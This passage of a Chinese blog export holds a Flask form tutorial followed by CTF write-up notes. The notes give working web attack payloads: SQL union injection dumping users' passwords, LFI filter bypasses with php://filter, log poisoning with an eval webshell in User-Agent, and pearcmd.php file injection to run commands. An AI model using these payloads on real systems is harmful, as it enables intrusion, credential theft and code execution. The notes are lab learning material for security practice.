&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;Bio Data Form&lt;/h1&gt;    &lt;form action=&quot;showbio&quot;&gt;        &lt;label&gt;Username&lt;/label&gt;        &lt;input type=&quot;name&quot; name=&quot;username&quot;&gt;&lt;br&gt;        &lt;label&gt;Email&lt;/label&gt;        &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;&lt;br&gt;        &lt;label&gt;Hobbies&lt;/label&gt;        &lt;input type=&quot;name&quot; name=&quot;hobbies&quot;&gt;&lt;br&gt;        &lt;input type=&quot;submit&quot; name=&quot;&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 

第二个为显示用户资料的：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Bio-Data Details&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;Bio-Data Details&lt;/h1&gt;    &lt;hr&gt;    &lt;h1&gt;Username: &#123;&#123; username &#125;&#125;&lt;/h1&gt;    &lt;h1&gt;Email: &#123;&#123; email &#125;&#125;&lt;/h1&gt;    &lt;h1&gt;Hobbies: &#123;&#123; hobbies &#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;

接下来就是python文件，在之前的基础上继续增加的：
from flask import Flask, render_template, request, redirect, url_forapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    # 定义一个变量，在模板中使用    greeting = &#x27;Hello, World!&#x27;    # 渲染模板并传递参数    return render_template(&#x27;index.html&#x27;, greeting=greeting)@app.route(&#x27;/form&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def bio_data_form():    if request.method == &quot;POST&quot;:        username = request.form[&#x27;username&#x27;]        age = request.form[&#x27;age&#x27;]        email = request.form[&#x27;email&#x27;]        hobbies = request.form[&#x27;hobbies&#x27;]        return redirect(url_for(&#x27;showbio&#x27;,                                username=username,                                age=age,                                email=email,                                hobbies=hobbies))    return render_template(&quot;bio_form.html&quot;)@app.route(&#x27;/showbio&#x27;, methods=[&#x27;GET&#x27;])  #get方法访问该路由def showbio():    username = request.args.get(&#x27;username&#x27;)    age = request.args.get(&#x27;age&#x27;)    email = request.args.get(&#x27;email&#x27;)    hobbies = request.args.get(&#x27;hobbies&#x27;)    return render_template(&quot;show_bio.html&quot;,                           username=username,                           age=age,                           email=email,                           hobbies=hobbies)if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)


redirect: 这是 Flask 中的一个重定向函数，用于将用户重定向到指定的 URL 地址。

url_for(&#39;showbio&#39;, username=username, age=age, email=email, hobbies=hobbies): 这是 Flask 中的一个 URL 构建函数，用于构建指定视图函数的 URL 地址。其中，&#39;showbio&#39; 是要构建 URL 的视图函数的名称，结果会返回与名为 &#39;showbio&#39; 的视图函数关联的 URL 地址，并将后面的参数作为查询参数添加到该 URL 中

request.args.get() 方法来获取 URL 查询字符串中的参数值。
具体来说，request.args 是一个字典对象，包含了 URL 查询字符串中的所有参数。而 request.args.get() 方法则用于从这个字典中获取指定参数的值


]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>解题心得</title>
    <url>/2023/11/11/%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97_max/%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[1.http（极客大挑战）首先查看源码发现 &lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;，点击该链接
然后通过页面信息修改referer：https://Sycsecret.buuoj.cn
接着浏览器信息，即 User-Agent:Syclover，然后告诉我们要从本地查看，上网查找发现本地都是这个端口号 127.0.0.1，修改xxf，然后flag就出来了
2.查看网页的备份文件（攻防世界）php的备份文件有两种：*.php~和*.php.bak
例子：http://61.147.171.105:55767/index.php.bak
2.机器人协议url&#x2F;robots.txt
3.php2（攻防世界）对网址后面加上&#x2F;index.phps就可以查看页面php源码
例子：http://111.198.29.45:45191/index.phps
phps是php的源代码文件，但是不能接受传参，所以hackbar还是要在.php里面做
4.cookie（攻防世界）如何查看http响应
打开开发者工具，再点击网络(network)，选择你想要查看http响应的网址
这道题的flag位于标头里面
5.扫描目录用dirsearch（攻防世界）dirsearch -u &lt;URL&gt;是要扫描的目标网站的URL
可以用以下选项来调整扫描：
-e:指定要排除的扩展名
-f:指定要包含的扩展名
-x:指定要排除的目录
-t:指定线程数
例子：dirsearch -u https://example.com/ -f php,html -t 50（用50个线程扫描一个URL，只包括.php和.html文件）
dirsearch -u https://example.com/ -o result.txt

将扫描结果保存到result.txt文件中
6.very_easy_sqli 880本题使用的是union注入（整形和字符型）
最开始通过查看源代码发现使用的是post
前面注入步骤来查询出数据库名称叫做ez.php，表名叫作users
接着通过需要查出这个表内有的所有的字段名：id,username,password
username=222&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;#&amp;password=123

然后我们需要查出这些字段下得内容，找出flag，这里采用一劳永逸的做法
username=222&#x27; union select 1,group_concat(id,username,password),3 from ez_php.users#&amp;password=123

注意：必须用group_concat才能找出字段下面的所有内容，否则只会查询出第一行的内容
7.ez_double_cmd(php伪代码协议)&lt;?phphighlight_file(__FILE__);error_reporting(0);print(&quot;easy lfi, but no flag~~&quot;);$cmd = $_POST[&#x27;cmd&#x27;];//flag in /flagif (isset($cmd)) &#123;    print (&quot;first one:&quot; . &quot;&lt;br&gt;&quot;);    $cmd = preg_replace(&quot;/flag/i&quot;, &#x27;&#x27;, $cmd);    echo $cmd;    if (preg_match(&quot;/flag/i&quot;, $cmd)) &#123;        include($cmd);    &#125;&#125; 

（1）highlight_file()函数
highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。
提示：用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。
注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！
语法： highlight_file(*filename,return*)



参数
描述



filename
必需。规定要显示的文件。


return
可选。如果该参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。默认是 FALSE。


（2）preg_replace函数
作用：执行正则表达式搜索和替换的函数
基础语法： preg_replace(pattern, replacement, subject);

pattern：要搜索的模式（正则表达式）。
replacement：替换模式或者替换字符串。
subject：要进行搜索替换的源字符串或数组。

这个函数会在 subject 字符串中搜索与 pattern 匹配的内容，并使用 replacement 进行替换。可以通过正则表达式定义灵活的搜索模式，并对匹配的内容进行替换或处理。
（3）preg_match函数
作用：用于正则表达式匹配的函数之一。它用于检查字符串是否与给定的正则表达式模式匹配。
基础语法： preg_match(string $pattern, string $subject, array &amp;$matches = null, int $flags = 0, int $offset = 0): int|false

$pattern 是要匹配的正则表达式模式。
$subject 是要检查的字符串。
$matches 是一个可选参数，用于存储匹配的结果。
$flags 是一个可选参数，用于指定匹配模式。
$offset 是一个可选参数，用于指定开始搜索的位置偏移量。

preg_match() 返回成功匹配的次数（通常是 1），如果没有匹配到则返回 0，如果发生错误则返回 false。

$pattern=&quot;/flag/i&quot; 是一个正则表达式模式。在这里，/flag/i 是一个包含了两个部分的正则表达式：

/flag/：这是正则表达式的模式部分。它表示要匹配的文本模式是 “flag”。
i：这是一个修饰符，用于修改正则表达式的行为。在这里，i 是忽略大小写的修饰符，它表示匹配时不区分字母的大小写。

我们需要经过这个函数后应该还有flag这个词，所以需要双写绕过，即 cmd=flflagag；
绕过之后发现 include($cmd)木有反应，后面经过土豆哥的解释才明白有反应，只是没有显示出任何的内容
尝试用php伪协议来继续作答:
cmd=php://filter/read=convert.base64-encode/resource=/flflagag

通过这行代码成功获取到base64编码后的内容：PD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw==
经过base64解编码后得到 &lt;?php $FLAG = &quot;ROIS&#123;doudoubleble_cmcmdd_wiwinn&#125;&quot;;
由于FLAG是一个变量，在执行完后不会再前端显示任何内容
解法二之日志包含
仅限于日志内容不多的情况下，要不然显示不出来
首先将 User-Agent的内容改为php代码 &lt;?php eval($_POST[kang]);?&gt;
接着POST传参内容为
cmd=flflagag/../../../../../../../var/log/apache2/access.log&amp;kang=system(&#x27;cat /flag|base64&#x27;)   要有空格

最后就可以得到base64编码后的flag，解码后就得到了flag的内容
8.double_cmd_plus前文Linux上执行某个可执行文件的方式是：&#x2F;文件名eg:执行当前目录下一个hello.sh：.&#x2F;hello.sh
其实只要指定了绝对路径或者相对路径都能直接操控的

flag文件加了0600权限：意味着只有文件的所有者具有读取和写入权限，而其他用户（组成员和其他用户）没有任何权限
c文件编译后的可执行文件加了u+s权限：意味着当用户执行这个文件时，将临时使用文件所有者的权限来执行该文件，而不是使用执行用户的权限。
C文件（readflag.c）中的代码如下：
int main(void) &#123;  char flag[256] = &#123;0&#125;;  FILE* fp = fopen(&quot;/flag&quot;, &quot;r&quot;);  if (!fp) &#123;    perror(&quot;fopen&quot;);    return 1;  &#125;  if (fread(flag, 1, 256, fp) &lt; 0) &#123;    perror(&quot;fread&quot;);    return 1;  &#125;  puts(flag);  fclose(fp);  return 0;&#125;

这段代码尝试打开名为 “&#x2F;flag” 的文件，读取其内容并将其输出到标准输出。如果打开或读取文件失败，程序会打印相应的错误消息并退出
题目代码如下
&lt;?phphighlight_file(__FILE__);error_reporting(0);print (&quot;easy lfi, but no flag~~&quot;);$cmd = $_POST[&#x27;cmd&#x27;];//flag in /flagif (isset($cmd)) &#123;    print (&quot;first one:&quot; . &quot;&lt;br&gt;&quot;);    $cmd = preg_replace(&quot;/flag/i&quot;, &#x27;&#x27;, $cmd);    echo $cmd;    if (preg_match(&quot;/flag/i&quot;, $cmd)) &#123;        include($cmd);    &#125;&#125;


做题过程首先我们需要包含pearcmd.php文件才能够进行下一步，即利用pearcmd.php的漏洞插入一个文件（要用bp来操作，在重放器里面）

成功插入文件之后我们就转战hackbar
通过 cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#39;ls /&#39;);我们可以知道readflag文件（编译后的文件）位于根目录，所以我们需要退到根目录处去执行，即
cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#x27;../../../../.././readflag&#x27;);

这样子发现没有任何内容显示，查看flag文件代码后发现是因为php变量不会被直接显示在前端，于是尝试对其进行base64编码
cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#x27;../../../../.././readflag|base64&#x27;);

cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#x27;../../../../../readflag|base64&#x27;);（这样也可以的）

成功显示出编码后的flag文件内容，拿去解码后得到flag
&lt;?php$FLAG = &quot;ROIS&#123;lfitoshellissoeasy&#125;&quot;;

（其实最开始做的时候用这个方法怎么都是行不通的，但不知道为啥晚上再试一次就成功了）
再经过了豆哥的提示后明白当知道文件的绝对路径或者相对路径的时候便可以直接执行该文件，所以有下面第二种方式得到flag
cmd=flflagag../../../../../../tmp/hack.php&amp;kang=system(&#x27;/readflag|base64&#x27;);


结语这道题能够做出来还是要感谢土豆粉和土豆哥，对我解决这道题的帮助太大了
做的时候对pearcmd.php漏洞的理解还是不太深刻，对于bp的使用也不熟，导致最开始的时候浪费了很多的时间。
这道题综合能力非常强，以前用到的知识点好多都又用上了
9.easy-PDD（爆破）这道题先用bp抓包，然后用bp中的爆破模式，也就是Intruder模式来发送好多好多的请求包，得到flag
具体爆破模式操作步骤可以参考：https://blog.csdn.net/FTQOOO/article/details/103822526
10.源码泄露url&#x2F;www.zip：会下载相关源码
11.信息泄露（总）资料查看网址：https://blog.csdn.net/a597934448/article/details/105431367
12.Vim意外退出临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容
以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp第二次意外退出后，文件名为.index.php.swo第三次产生的缓存文件则为 .index.php.swn注意：index前有 “ . “
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
</search>
